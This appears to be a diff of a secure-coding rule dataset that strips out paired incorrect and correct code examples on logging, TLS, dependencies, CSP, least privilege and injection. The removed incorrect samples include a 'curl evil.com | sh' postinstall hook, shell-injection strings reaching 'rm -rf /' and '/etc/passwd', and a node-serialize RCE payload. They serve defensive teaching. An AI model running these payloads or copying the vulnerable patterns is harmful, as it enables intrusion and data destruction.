-            "code": "// ✅ Newsletter signup — email only\nconst NewsletterSchema = z.object({\n  email: z.string().email().max(254),\n  name:  z.string().max(100).optional(),  // optional, for personalization only\n})\n\n// ✅ Extract only needed fields from third-party responses\nconst githubUser = await fetchGithubUser(token)\nawait db.users.create({\n  data: {\n    githubId:   githubUser.id,\n    username:   githubUser.login,\n    avatarUrl:  githubUser.avatar_url,\n    email:      githubUser.email,\n    // Not storing: followers, following, repos, bio, company, location, etc.\n  }\n})\n\n// ✅ Define retention policies — auto-delete old data\n// Delete sessions older than 30 days\nawait db.sessions.deleteMany({\n  where: { createdAt: { lt: new Date(Date.now() - 30 * 24 * 60 * 60 * 1000) } }\n})\n\n// ✅ Anonymize instead of delete for analytics\nawait db.orders.update({\n  where: { userId: deletedUserId },\n  data: {\n    userId:      null,\n    email:       null,\n    name:        'Deleted User',\n    // Keep: orderId, amount, date — for financial records\n  }\n})"
-          }
-        }
-      ]
+      "pairs": []
     },
     {
       "skill": "secure-coding-best-practices",
@@ -435,18 +259,7 @@
         "gdpr",
         "privacy"
       ],
-      "pairs": [
-        {
-          "incorrect": {
-            "lang": "typescript",
-            "code": "// ❌ Full PII logged\nconsole.log(`User login: email=${req.body.email}, password=${req.body.password}`)\nconsole.log(`Processing payment for card: ${cardNumber}, cvv: ${cvv}`)\nconsole.log(`Error for user ${user.ssn}:`, error)\n\n// ❌ Entire request body logged (includes passwords, tokens)\napp.use((req, res, next) => {\n  console.log('Request body:', JSON.stringify(req.body))\n  next()\n})"
-          },
-          "correct": {
-            "lang": "typescript",
-            "code": "// ✅ Mask helpers\nfunction maskEmail(email: string): string {\n  const [local, domain] = email.split('@')\n  return `${local.charAt(0)}***@${domain}`  // j***@example.com\n}\n\nfunction maskCard(cardNumber: string): string {\n  return `****-****-****-${cardNumber.slice(-4)}`  // ****-****-****-1234\n}\n\nfunction maskSsn(ssn: string): string {\n  return `***-**-${ssn.slice(-4)}`  // ***-**-6789\n}\n\nfunction redactSensitiveKeys(obj: Record<string, unknown>): Record<string, unknown> {\n  const SENSITIVE = new Set(['password', 'token', 'secret', 'cvv', 'ssn', 'cardNumber'])\n  return Object.fromEntries(\n    Object.entries(obj).map(([k, v]) =>\n      SENSITIVE.has(k.toLowerCase()) ? [k, '[REDACTED]'] : [k, v]\n    )\n  )\n}\n\n// ✅ Structured logging with selective fields\nlogger.info('user.login', {\n  userId:    user.id,              // OK — internal ID\n  email:     maskEmail(user.email), // masked\n  ip:        req.ip,               // OK for audit\n  userAgent: req.headers['user-agent'],\n  // NO password, NO full email\n})\n\n// ✅ Redact body before logging\napp.use((req, res, next) => {\n  const safeBody = redactSensitiveKeys(req.body)\n  logger.debug('request', { method: req.method, path: req.path, body: safeBody })\n  next()\n})\n\n// ✅ Use Pino with redact option\nimport pino from 'pino'\nconst logger = pino({\n  redact: {\n    paths: ['req.body.password', 'req.body.token', '*.ssn', '*.cardNumber'],\n    censor: '[REDACTED]',\n  },\n})"
-          }
-        }
-      ]
+      "pairs": []
     },
     {
       "skill": "secure-coding-best-practices",
@@ -462,18 +275,7 @@
         "ssl",
         "certificate"
       ],
-      "pairs": [
-        {
-          "incorrect": {
-            "lang": "typescript",
-            "code": "// ❌ HTTP connection to database — credentials sent in plain text\nimport { Pool } from 'pg'\nconst pool = new Pool({\n  host: 'db.internal.example.com',\n  user: 'app_user',\n  password: process.env.DB_PASSWORD,\n  ssl: false,  // Plain text connection — password visible on network\n})\n\n// ❌ Internal microservice call without TLS\nconst response = await fetch('http://user-service.internal:3000/api/users/123')\n// Authentication headers sent in plain text over the network\n\n// ❌ Node.js HTTPS server allowing TLS 1.0\nimport https from 'https'\nconst server = https.createServer({\n  key: fs.readFileSync('server.key'),\n  cert: fs.readFileSync('server.crt'),\n  // No minVersion set — defaults allow TLS 1.0 and 1.1\n})"
-          },
-          "correct": {
-            "lang": "typescript",
-            "code": "// ✅ Database connection with TLS required\nimport { Pool } from 'pg'\nconst pool = new Pool({\n  host: 'db.internal.example.com',\n  user: 'app_user',\n  password: process.env.DB_PASSWORD,\n  ssl: {\n    rejectUnauthorized: true,              // Verify server certificate\n    ca: fs.readFileSync('/etc/ssl/db-ca.pem'),  // Pin the CA\n    minVersion: 'TLSv1.2',                // Reject TLS 1.0/1.1\n  },\n})\n\n// ✅ Internal service calls over HTTPS\nconst response = await fetch('https://user-service.internal:3000/api/users/123', {\n  headers: { Authorization: `Bearer ${token}` },\n})\n\n// ✅ HTTPS server with TLS 1.2+ minimum\nimport https from 'https'\nconst server = https.createServer({\n  key: fs.readFileSync('server.key'),\n  cert: fs.readFileSync('server.crt'),\n  minVersion: 'TLSv1.2',     // Reject TLS 1.0 and 1.1\n  ciphers: [                   // Strong cipher suites only\n    'TLS_AES_256_GCM_SHA384',\n    'TLS_CHACHA20_POLY1305_SHA256',\n    'ECDHE-RSA-AES256-GCM-SHA384',\n  ].join(':'),\n})"
-          }
-        }
-      ]
+      "pairs": []
     },
     {
       "skill": "secure-coding-best-practices",
@@ -489,18 +291,7 @@
         "ci",
         "snyk"
       ],
-      "pairs": [
-        {
-          "incorrect": {
-            "lang": "bash",
-            "code": "# ❌ Never auditing dependencies\nnpm install\n# old lodash with prototype pollution — undetected for months\n# old express with ReDoS — never flagged"
-          },
-          "correct": {
-            "lang": "yaml",
-            "code": "# ✅ GitHub Actions — audit on every push and weekly\nname: Dependency Security Audit\non:\n  push:\n    branches: [main]\n  pull_request:\n  schedule:\n    - cron: '0 9 * * 1'  # Every Monday 9am\n\njobs:\n  audit:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: npm audit (fail on high+)\n        run: npm audit --audit-level=high\n\n      - name: Snyk vulnerability scan\n        uses: snyk/actions/node@master\n        env:\n          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}\n        with:\n          args: --severity-threshold=high\n\n      - name: Check for outdated packages\n        run: npx npm-check-updates --errorLevel 2"
-          }
-        }
-      ]
+      "pairs": []
     },
     {
       "skill": "secure-coding-best-practices",
@@ -515,18 +306,7 @@
         "package-lock",
         "yarn-lock"
       ],
-      "pairs": [
-        {
-          "incorrect": {
-            "lang": "bash",
-            "code": "# ❌ .gitignore includes lock files — every install can differ\n# .gitignore\npackage-lock.json\nyarn.lock\n\n# ❌ npm install in CI — ignores lock file, installs latest matching semver\nRUN npm install  # Dockerfile\n\n# ❌ --no-lockfile flag disables lock\nyarn install --no-lockfile"
-          },
-          "correct": {
-            "lang": "bash",
-            "code": "# ✅ Commit lock file — never add to .gitignore\n# .gitignore should NOT contain: package-lock.json, yarn.lock, pnpm-lock.yaml\n\n# ✅ Use npm ci in CI — enforces lock file exactly\nRUN npm ci --omit=dev  # Dockerfile — faster, reproducible, fails if lock is stale\n\n# ✅ Verify lock file integrity in CI\n# package-lock.json contains sha512 integrity hashes for every package"
-          }
-        }
-      ]
+      "pairs": []
     },
     {
       "skill": "secure-coding-best-practices",
@@ -540,18 +320,7 @@
         "package-selection",
         "minimalism"
       ],
-      "pairs": [
-        {
-          "incorrect": {
-            "lang": "bash",
-            "code": "# ❌ Installing lodash for one utility function\nnpm install lodash         # 100+ functions — adds 70kB to bundle\n\n# ❌ Package with excessive permissions\n# package.json (malicious package)\n# \"scripts\": { \"postinstall\": \"curl evil.com | sh\" }\n\n# ❌ Using a package with known issues and no recent maintenance\nnpm install left-pad       # famous example of fragile supply chain\nnpm install event-stream   # was compromised in 2018 to steal Bitcoin"
-          },
-          "correct": {
-            "lang": "bash",
-            "code": "# ✅ Use native alternatives before adding a package\n# Instead of lodash.get:\nconst value = obj?.deeply?.nested?.value ?? defaultValue\n\n# Instead of axios (for simple requests):\nconst res = await fetch('https://api.example.com/data')\nconst data = await res.json()\n\n# Instead of moment.js (heavy, unmaintained):\n# Use date-fns (tree-shakeable) or Temporal API\n\n# ✅ Evaluate a package before installing\nnpx package-phobia [package-name]  # check install size\nnpx is-esm [package-name]          # check ESM support"
-          }
-        }
-      ]
+      "pairs": []
     },
     {
       "skill": "secure-coding-best-practices",
@@ -566,18 +335,7 @@
         "architecture",
         "abuse-cases"
       ],
-      "pairs": [
-        {
-          "incorrect": {
-            "lang": "typescript",
-            "code": "// ❌ Feature designed and built without threat analysis\n// User story: \"As a user, I can share files with other users via a public link\"\n//\n// What the team missed:\n//   - No expiry on share links → permanent access even after revocation intent\n//   - Sequential share IDs → attacker can enumerate all shared files\n//   - No access logging → breach goes undetected\n//   - No rate limiting on link creation → mass exfiltration tool\n//   - Shared files include metadata with internal user IDs\n\napp.post('/api/shares', async (req, res) => {\n  const share = await db.shares.create({\n    fileId: req.body.fileId,\n    shareId: nextSequentialId++,        // Enumerable!\n    // No expiry, no access controls, no audit trail\n  })\n  res.json({ url: `https://app.com/share/${share.shareId}` })\n})"
-          },
-          "correct": {
-            "lang": "markdown",
-            "code": "# Threat Model: File Sharing Feature\n\n## Data Flow\nUser → API Gateway → Share Service → Object Storage\n                  ↘ Notification Service → Email\n\n## Trust Boundaries\n1. Public Internet ↔ API Gateway (authentication required)\n2. API Gateway ↔ Internal Services (mTLS, service mesh)\n3. Share Link ↔ Object Storage (pre-signed URL, time-limited)\n\n## STRIDE Analysis\n\n| Threat | Category | Mitigation |\n|--------|----------|------------|\n| Attacker guesses share IDs | Spoofing | Use UUID v4 (128-bit random), not sequential IDs |\n| Revoked link still works | Tampering | Expire links after 7 days, support manual revocation |\n| No record of who accessed | Repudiation | Log every access with IP, user-agent, timestamp |\n| Shared file leaks metadata | Information Disclosure | Strip internal metadata before serving |\n| Mass link creation for exfiltration | Denial of Service | Rate limit: 10 shares/user/hour |\n| Link bypasses file permissions | Elevation of Privilege | Verify sharer still has access on every link use |\n\n## Abuse Cases\n- Attacker creates thousands of share links to exfiltrate entire drive\n- Former employee's share links remain active after account deletion\n- Search engines index share links, making files publicly discoverable"
-          }
-        }
-      ]
+      "pairs": []
     },
     {
       "skill": "secure-coding-best-practices",
@@ -592,18 +350,7 @@
         "graceful-degradation",
         "availability"
       ],
-      "pairs": [
-        {
-          "incorrect": {
-            "lang": "typescript",
-            "code": "// ❌ Unbounded retries — amplifies downstream failures\nasync function getRecommendations(userId: string): Promise<Product[]> {\n  // If recommendation-service is down, this retries forever\n  // Each request waits 30s (default timeout), blocking a thread\n  // 100 concurrent users = 100 blocked connections = app is frozen\n  while (true) {\n    try {\n      const res = await fetch(`http://recommendation-service/api/recommend/${userId}`)\n      return await res.json()\n    } catch {\n      // Retry immediately — hammers the failing service\n      await new Promise(r => setTimeout(r, 100))\n    }\n  }\n}\n\n// API handler blocks entirely when recommendations are unavailable\napp.get('/api/products', async (req, res) => {\n  const products = await getProducts()\n  const recommendations = await getRecommendations(req.user.id)  // Blocks forever\n  res.json({ products, recommendations })\n})"
-          },
-          "correct": {
-            "lang": "typescript",
-            "code": "import CircuitBreaker from 'opossum'\n\n// ✅ Circuit breaker wraps the unreliable call\nconst recommendationBreaker = new CircuitBreaker(\n  async (userId: string): Promise<Product[]> => {\n    const res = await fetch(`http://recommendation-service/api/recommend/${userId}`, {\n      signal: AbortSignal.timeout(3000),  // 3s timeout per request\n    })\n    if (!res.ok) throw new Error(`Service returned ${res.status}`)\n    return res.json()\n  },\n  {\n    timeout: 5000,           // Max 5s before considering a failure\n    errorThresholdPercentage: 50,  // Open circuit after 50% failures\n    resetTimeout: 30000,     // Try again after 30s\n    volumeThreshold: 5,      // Minimum 5 requests before calculating error rate\n  }\n)\n\n// ✅ Fallback returns cached/default data when circuit is open\nrecommendationBreaker.fallback(async (userId: string) => {\n  // Return cached recommendations or popular items\n  const cached = await cache.get(`recommendations:${userId}`)\n  return cached ?? await getPopularProducts()\n})\n\n// ✅ API handler degrades gracefully — always responds\napp.get('/api/products', async (req, res) => {\n  const products = await getProducts()\n  const recommendations = await recommendationBreaker.fire(req.user.id)\n  res.json({ products, recommendations })  // Always returns, even if recommendations are fallback data\n})"
-          }
-        }
-      ]
+      "pairs": []
     },
     {
       "skill": "secure-coding-best-practices",
@@ -619,18 +366,7 @@
         "privacy",
         "gdpr"
       ],
-      "pairs": [
-        {
-          "incorrect": {
-            "lang": "typescript",
-            "code": "// ❌ Logging the entire request body — includes passwords and tokens\napp.post('/api/login', async (req, res) => {\n  logger.info('Login attempt', { body: req.body })\n  // Logs: { body: { email: \"user@example.com\", password: \"MyS3cret!\" } }\n\n  const user = await authenticate(req.body.email, req.body.password)\n  logger.info('Login successful', { user })\n  // Logs: { user: { id: 1, email: \"user@example.com\", ssn: \"123-45-6789\" } }\n})\n\n// ❌ Logging authorization headers — exposes JWT/API keys\napp.use((req, res, next) => {\n  logger.debug('Incoming request', {\n    url: req.url,\n    headers: req.headers,  // Includes Authorization: Bearer eyJhbGci...\n  })\n  next()\n})"
-          },
-          "correct": {
-            "lang": "typescript",
-            "code": "import pino from 'pino'\n\n// ✅ Configure logger with automatic redaction of sensitive fields\nconst logger = pino({\n  redact: {\n    paths: [\n      'req.headers.authorization',\n      'req.headers.cookie',\n      'body.password',\n      'body.confirmPassword',\n      'body.token',\n      'body.creditCard',\n      'body.ssn',\n      'user.ssn',\n      'user.password',\n      '*.secret',\n      '*.apiKey',\n    ],\n    censor: '[REDACTED]',\n  },\n})\n\n// ✅ Log only safe, non-sensitive identifiers\napp.post('/api/login', async (req, res) => {\n  logger.info({ email: req.body.email }, 'Login attempt')\n  // Logs: { email: \"user@example.com\", msg: \"Login attempt\" }\n\n  const user = await authenticate(req.body.email, req.body.password)\n  logger.info({ userId: user.id, role: user.role }, 'Login successful')\n  // Logs: { userId: 1, role: \"user\", msg: \"Login successful\" }\n})\n\n// ✅ Mask PII helper for when logging is necessary\nfunction maskEmail(email: string): string {\n  const [local, domain] = email.split('@')\n  return `${local[0]}***@${domain}`  // \"u***@example.com\"\n}"
-          }
-        }
-      ]
+      "pairs": []
     },
     {
       "skill": "secure-coding-best-practices",
@@ -644,18 +380,7 @@
         "information-disclosure",
         "production"
       ],
-      "pairs": [
-        {
-          "incorrect": {
-            "lang": "typescript",
-            "code": "// ❌ Default Express error handler — sends full stack to client\napp.use((err: Error, req: Request, res: Response, next: NextFunction) => {\n  res.status(500).json({ error: err.message, stack: err.stack })\n  // Exposes: /app/src/routes/users.ts, column names, SQL queries, etc.\n})\n\n// ❌ Unhandled promise rejection exposes details in response\napp.get('/user/:id', async (req, res) => {\n  const user = await db.user.findOrFail(req.params.id)  // throws: \"Record not found in table users\"\n  res.json(user)\n  // Error message reveals table name and query pattern\n})"
-          },
-          "correct": {
-            "lang": "typescript",
-            "code": "import { randomUUID } from 'crypto'\n\n// ✅ Centralized error handler — generic client response, full server log\napp.use((err: unknown, req: Request, res: Response, _next: NextFunction) => {\n  const errorId = randomUUID()\n\n  // Log full details server-side with correlation ID\n  logger.error({\n    errorId,\n    message: err instanceof Error ? err.message : String(err),\n    stack:   err instanceof Error ? err.stack : undefined,\n    url:     req.url,\n    method:  req.method,\n    userId:  req.user?.id,\n  })\n\n  // Determine HTTP status from error type\n  if (err instanceof ValidationError) {\n    return res.status(400).json({ error: 'Invalid request', errorId })\n  }\n  if (err instanceof AuthError) {\n    return res.status(401).json({ error: 'Unauthorized', errorId })\n  }\n  if (err instanceof ForbiddenError) {\n    return res.status(403).json({ error: 'Forbidden', errorId })\n  }\n  if (err instanceof NotFoundError) {\n    return res.status(404).json({ error: 'Not found', errorId })\n  }\n\n  // ✅ Generic 500 — no internal details\n  res.status(500).json({\n    error:   'An unexpected error occurred',\n    errorId, // user can report this ID; engineer can find full details in logs\n  })\n})\n\n// ✅ Also handle unhandled rejections\nprocess.on('unhandledRejection', (reason) => {\n  logger.error({ message: 'Unhandled promise rejection', reason })\n})"
-          }
-        }
-      ]
+      "pairs": []
     },
     {
       "skill": "secure-coding-best-practices",
@@ -670,18 +395,7 @@
         "file-handle",
         "finally"
       ],
-      "pairs": [
-        {
-          "incorrect": {
-            "lang": "typescript",
-            "code": "// ❌ Database connection leaked if query throws\nasync function getUserOrders(userId: string): Promise<Order[]> {\n  const connection = await pool.getConnection()\n  // If this query throws, the connection is never released\n  const orders = await connection.query('SELECT * FROM orders WHERE user_id = ?', [userId])\n  connection.release()  // Never reached on error!\n  return orders\n}\n\n// ❌ File handle leaked if processing throws\nasync function processUpload(filePath: string): Promise<void> {\n  const handle = await fs.open(filePath, 'r')\n  const content = await handle.readFile('utf-8')\n  const parsed = JSON.parse(content)  // Throws on malformed JSON\n  await processData(parsed)\n  await handle.close()  // Never reached on error!\n}\n\n// ❌ Temporary file not cleaned up\nasync function generateReport(data: ReportData): Promise<string> {\n  const tempPath = `/tmp/report-${Date.now()}.pdf`\n  await writePDF(tempPath, data)\n  const url = await uploadToS3(tempPath)  // If this throws, temp file remains on disk\n  await fs.unlink(tempPath)  // Never reached on error!\n  return url\n}"
-          },
-          "correct": {
-            "lang": "typescript",
-            "code": "// ✅ try/finally ensures connection is always released\nasync function getUserOrders(userId: string): Promise<Order[]> {\n  const connection = await pool.getConnection()\n  try {\n    const orders = await connection.query('SELECT * FROM orders WHERE user_id = ?', [userId])\n    return orders\n  } finally {\n    connection.release()  // Always runs, even on exception\n  }\n}\n\n// ✅ Using Symbol.asyncDispose (TC39 Explicit Resource Management)\nasync function processUpload(filePath: string): Promise<void> {\n  await using handle = await fs.open(filePath, 'r')\n  // handle is automatically closed when scope exits, even on exception\n  const content = await handle.readFile('utf-8')\n  const parsed = JSON.parse(content)\n  await processData(parsed)\n}\n\n// ✅ Cleanup in finally for temporary files\nasync function generateReport(data: ReportData): Promise<string> {\n  const tempPath = `/tmp/report-${Date.now()}.pdf`\n  try {\n    await writePDF(tempPath, data)\n    const url = await uploadToS3(tempPath)\n    return url\n  } finally {\n    // Clean up temp file regardless of success or failure\n    await fs.unlink(tempPath).catch(() => {})  // Ignore \"file not found\" errors\n  }\n}"
-          }
-        }
-      ]
+      "pairs": []
     },
     {
       "skill": "secure-coding-best-practices",
@@ -697,18 +411,7 @@
         "audit-trail",
         "siem"
       ],
-      "pairs": [
-        {
-          "incorrect": {
-            "lang": "typescript",
-            "code": "// ❌ Login endpoint with no logging\napp.post('/auth/login', async (req, res) => {\n  const user = await verifyCredentials(req.body.email, req.body.password)\n  if (!user) return res.status(401).json({ error: 'Invalid credentials' })\n  const token = issueToken(user)\n  res.json({ token })\n  // No record of who logged in, from where, or when\n})"
-          },
-          "correct": {
-            "lang": "typescript",
-            "code": "import pino from 'pino'\n\nconst securityLogger = pino({\n  name: 'security',\n  redact: ['body.password', 'body.token'],\n})\n\n// ✅ Log all auth events with full context\napp.post('/auth/login', authLimiter, async (req, res) => {\n  const { email, password } = req.body\n  const ip        = req.ip\n  const userAgent = req.headers['user-agent']\n\n  try {\n    const user = await verifyCredentials(email, password)\n\n    if (!user) {\n      // ✅ Log failure — enough detail to detect brute force\n      securityLogger.warn({\n        event:     'auth.login.failure',\n        email:     maskEmail(email),\n        ip,\n        userAgent,\n        reason:    'invalid_credentials',\n        timestamp: new Date().toISOString(),\n      })\n      return res.status(401).json({ error: 'Invalid credentials' })\n    }\n\n    // ✅ Log success\n    securityLogger.info({\n      event:     'auth.login.success',\n      userId:    user.id,\n      email:     maskEmail(email),\n      ip,\n      userAgent,\n      timestamp: new Date().toISOString(),\n    })\n\n    res.json({ token: issueToken(user) })\n  } catch (err) {\n    securityLogger.error({ event: 'auth.login.error', ip, error: String(err) })\n    res.status(500).json({ error: 'Login failed' })\n  }\n})\n\n// ✅ Security events to log:\n// auth.login.success / failure\n// auth.logout\n// auth.token.refresh\n// auth.mfa.success / failure\n// auth.password.change / reset\n// authz.forbidden (403 on protected resource)\n// authz.suspicious (unexpected role escalation attempt)\n// user.created / deleted / role_changed\n// secret.accessed (for sensitive operations)"
-          }
-        }
-      ]
+      "pairs": []
     },
     {
       "skill": "secure-coding-best-practices",
@@ -723,18 +426,7 @@
         "xss",
         "injection"
       ],
-      "pairs": [
-        {
-          "incorrect": {
-            "lang": "typescript",
-            "code": "// ❌ No CSP header at all — any injected script executes\napp.get('/', (req, res) => {\n  res.send('<html>...</html>')\n})\n\n// ❌ Wildcard CSP — effectively useless\n// Content-Security-Policy: script-src *\n// Content-Security-Policy: default-src *; script-src 'unsafe-inline' 'unsafe-eval'"
-          },
-          "correct": {
-            "lang": "typescript",
-            "code": "import { randomBytes } from 'crypto'\nimport helmet from 'helmet'\n\n// ✅ Nonce-based CSP — unique nonce per request\napp.use((req, res, next) => {\n  res.locals.cspNonce = randomBytes(16).toString('base64')\n  next()\n})\n\napp.use((req, res, next) => {\n  helmet.contentSecurityPolicy({\n    directives: {\n      defaultSrc:     [\"'none'\"],\n      scriptSrc:      [\"'self'\", `'nonce-${res.locals.cspNonce}'`],\n      styleSrc:       [\"'self'\", `'nonce-${res.locals.cspNonce}'`],\n      imgSrc:         [\"'self'\", 'data:', 'https://cdn.example.com'],\n      fontSrc:        [\"'self'\", 'https://fonts.gstatic.com'],\n      connectSrc:     [\"'self'\", 'https://api.example.com'],\n      frameSrc:       [\"'none'\"],\n      objectSrc:      [\"'none'\"],\n      baseUri:        [\"'self'\"],\n      formAction:     [\"'self'\"],\n      upgradeInsecureRequests: [],\n      reportUri:      ['/api/csp-report'],  // log violations\n    },\n  })(req, res, next)\n})\n\n// ✅ Use the nonce in templates\n// <script nonce=\"<%= nonce %>\">...</script>\n\n// ✅ Next.js nonce-based CSP\n// middleware.ts\nimport { NextResponse } from 'next/server'\nimport { randomBytes } from 'crypto'\n\nexport function middleware(request: Request) {\n  const nonce = randomBytes(16).toString('base64')\n  const csp = [\n    `default-src 'none'`,\n    `script-src 'self' 'nonce-${nonce}'`,\n    `style-src 'self' 'nonce-${nonce}'`,\n    `img-src 'self' data:`,\n    `connect-src 'self'`,\n    `frame-ancestors 'none'`,\n  ].join('; ')\n\n  const response = NextResponse.next()\n  response.headers.set('Content-Security-Policy', csp)\n  response.headers.set('x-nonce', nonce)\n  return response\n}\n\n// ✅ Log CSP violations for monitoring\napp.post('/api/csp-report', express.json({ type: 'application/csp-report' }), (req, res) => {\n  logger.warn({ event: 'csp.violation', report: req.body['csp-report'] })\n  res.status(204).end()\n})"
-          }
-        }
-      ]
+      "pairs": []
     },
     {
       "skill": "secure-coding-best-practices",
@@ -750,18 +442,7 @@
         "aws",
         "service-accounts"
       ],
-      "pairs": [
-        {
-          "incorrect": {
-            "lang": "json",
-            "code": "// ❌ Lambda execution role with full admin — one compromise = full account takeover\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Effect\": \"Allow\",\n      \"Action\": \"*\",\n      \"Resource\": \"*\"\n    }\n  ]\n}\n\n// ❌ App connects to DB with root credentials\n// DATABASE_URL=postgresql://root:password@db.example.com/mydb\n// Root can DROP TABLE, CREATE USER, GRANT — far more than app needs"
-          },
-          "correct": {
-            "lang": "json",
-            "code": "// ✅ Lambda role — only the S3 bucket and operations it needs\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Effect\": \"Allow\",\n      \"Action\": [\n        \"s3:GetObject\",\n        \"s3:PutObject\"\n      ],\n      \"Resource\": \"arn:aws:s3:::my-app-uploads/*\"\n    },\n    {\n      \"Effect\": \"Allow\",\n      \"Action\": [\n        \"secretsmanager:GetSecretValue\"\n      ],\n      \"Resource\": \"arn:aws:secretsmanager:us-east-1:123456789:secret:prod/myapp/*\"\n    },\n    {\n      \"Effect\": \"Allow\",\n      \"Action\": [\n        \"logs:CreateLogGroup\",\n        \"logs:CreateLogStream\",\n        \"logs:PutLogEvents\"\n      ],\n      \"Resource\": \"arn:aws:logs:*:*:log-group:/aws/lambda/my-function:*\"\n    }\n  ]\n}"
-          }
-        }
-      ]
+      "pairs": []
     },
     {
       "skill": "secure-coding-best-practices",
@@ -777,18 +458,7 @@
         "xss-protection",
         "csp"
       ],
-      "pairs": [
-        {
-          "incorrect": {
-            "lang": "typescript",
-            "code": "// ❌ No security headers — browser uses defaults that are permissive\nconst app = express()\napp.use(express.json())\n// Missing: X-Frame-Options, X-Content-Type-Options, Referrer-Policy, HSTS, etc."
-          },
-          "correct": {
-            "lang": "typescript",
-            "code": "import helmet from 'helmet'\nimport express from 'express'\n\nconst app = express()\n\n// ✅ Helmet sets all recommended headers with secure defaults\napp.use(helmet())\n// Sets: X-Frame-Options: SAMEORIGIN\n//       X-Content-Type-Options: nosniff\n//       X-XSS-Protection: 0 (modern approach — rely on CSP)\n//       Referrer-Policy: no-referrer\n//       Strict-Transport-Security: max-age=15552000; includeSubDomains\n//       Permissions-Policy: (limits camera, mic, geolocation)\n//       Cross-Origin-Embedder-Policy: require-corp\n//       Cross-Origin-Opener-Policy: same-origin\n//       Cross-Origin-Resource-Policy: same-origin\n\n// ✅ Custom configuration for specific needs\napp.use(helmet({\n  frameguard:          { action: 'deny' },              // block all framing (stricter than SAMEORIGIN)\n  hsts:                { maxAge: 63072000, includeSubDomains: true, preload: true },\n  referrerPolicy:      { policy: 'strict-origin-when-cross-origin' },\n  contentSecurityPolicy: false,  // configure CSP separately (see infra-csp rule)\n}))\n\n// ✅ Verify your headers at:\n// https://securityheaders.com\n// https://observatory.mozilla.org\n\n// ✅ For Next.js — set in next.config.js\nconst nextConfig = {\n  async headers() {\n    return [\n      {\n        source: '/(.*)',\n        headers: [\n          { key: 'X-Frame-Options',         value: 'DENY' },\n          { key: 'X-Content-Type-Options',  value: 'nosniff' },\n          { key: 'Referrer-Policy',         value: 'strict-origin-when-cross-origin' },\n          { key: 'Permissions-Policy',      value: 'camera=(), microphone=(), geolocation=()' },\n        ],\n      },\n    ]\n  },\n}"
-          }
-        }
-      ]
+      "pairs": []
     },
     {
       "skill": "secure-coding-best-practices",
@@ -803,18 +473,7 @@
         "exec",
         "spawn"
       ],
-      "pairs": [
-        {
-          "incorrect": {
-            "lang": "typescript",
-            "code": "import { exec, execSync } from 'child_process'\n\n// ❌ Attacker sends: filename='; rm -rf /; echo '\nexec(`convert /uploads/${req.body.filename} output.jpg`, callback)\n\n// ❌ execSync with template literal\nconst result = execSync(`ping ${req.query.host}`)\n// ?host=8.8.8.8; cat /etc/passwd\n\n// ❌ Shell option enabled — still dangerous\nconst { exec } = require('child_process')\nexec('ls ' + userInput, { shell: true }, callback)"
-          },
-          "correct": {
-            "lang": "typescript",
-            "code": "import { spawn } from 'child_process'\nimport path from 'path'\n\n// ✅ spawn with array of arguments — never interpreted as shell commands\nfunction convertImage(filename: string): Promise<string> {\n  // Validate the filename first\n  if (!/^[a-zA-Z0-9_\\-]+\\.(jpg|png|gif|webp)$/.test(filename)) {\n    throw new Error('Invalid filename')\n  }\n\n  const inputPath  = path.resolve('/uploads', filename)\n  const outputPath = path.resolve('/processed', `${Date.now()}.jpg`)\n\n  return new Promise((resolve, reject) => {\n    const proc = spawn('convert', [inputPath, outputPath], {\n      shell: false,  // ✅ explicitly disable shell\n      timeout: 10000,\n    })\n    proc.on('close', code => {\n      if (code !== 0) reject(new Error(`convert exited with ${code}`))\n      else resolve(outputPath)\n    })\n  })\n}\n\n// ✅ For ping — allowlist hosts, use spawn\nfunction ping(host: string) {\n  const allowedHosts = ['8.8.8.8', '1.1.1.1', '8.8.4.4']\n  if (!allowedHosts.includes(host)) throw new Error('Host not allowed')\n\n  return spawn('ping', ['-c', '4', host], { shell: false })\n}"
-          }
-        }
-      ]
+      "pairs": []
     },
     {
       "skill": "secure-coding-best-practices",
@@ -829,18 +488,7 @@
         "input-validation",
         "prototype-pollution"
       ],
-      "pairs": [
-        {
-          "incorrect": {
-            "lang": "typescript",
-            "code": "// ❌ node-serialize executes functions embedded in serialized data\nimport { unserialize } from 'node-serialize'\n\napp.post('/api/session', (req, res) => {\n  // Attacker sends: {\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('rm -rf /')}()\"}\n  const session = unserialize(req.body.data)\n  res.json(session)\n})\n\n// ❌ eval-based deserialization\nfunction parseConfig(raw: string): Config {\n  return eval('(' + raw + ')')  // Executes arbitrary code!\n}\n\n// ❌ Unvalidated JSON.parse — prototype pollution\nconst userInput = JSON.parse(body)\n// If body = '{\"__proto__\":{\"isAdmin\":true}}', every object now has isAdmin=true\nObject.assign(defaults, userInput)"
-          },
-          "correct": {
-            "lang": "typescript",
-            "code": "import { z } from 'zod'\n\n// ✅ Parse JSON then immediately validate against a strict schema\nconst SessionSchema = z.object({\n  userId: z.string().uuid(),\n  role: z.enum(['user', 'admin']),\n  expiresAt: z.string().datetime(),\n})\n\napp.post('/api/session', (req, res) => {\n  const parsed = SessionSchema.safeParse(req.body)\n  if (!parsed.success) {\n    return res.status(400).json({ error: 'Invalid session data' })\n  }\n  // parsed.data is typed and validated — no extra properties\n  res.json(parsed.data)\n})\n\n// ✅ Prevent prototype pollution with Object.create(null) or explicit property checks\nfunction safeMerge(target: Record<string, unknown>, source: Record<string, unknown>) {\n  for (const key of Object.keys(source)) {\n    if (key === '__proto__' || key === 'constructor' || key === 'prototype') {\n      continue  // Block prototype pollution vectors\n    }\n    target[key] = source[key]\n  }\n  return target\n}"
-          }
-        }
-      ]
+      "pairs": []
     },
     {
       "skill": "secure-coding-best-practices",
@@ -855,18 +503,7 @@
         "orm",
         "allowlist"
       ],
-      "pairs": [
-        {
-          "incorrect": {
-            "lang": "typescript",
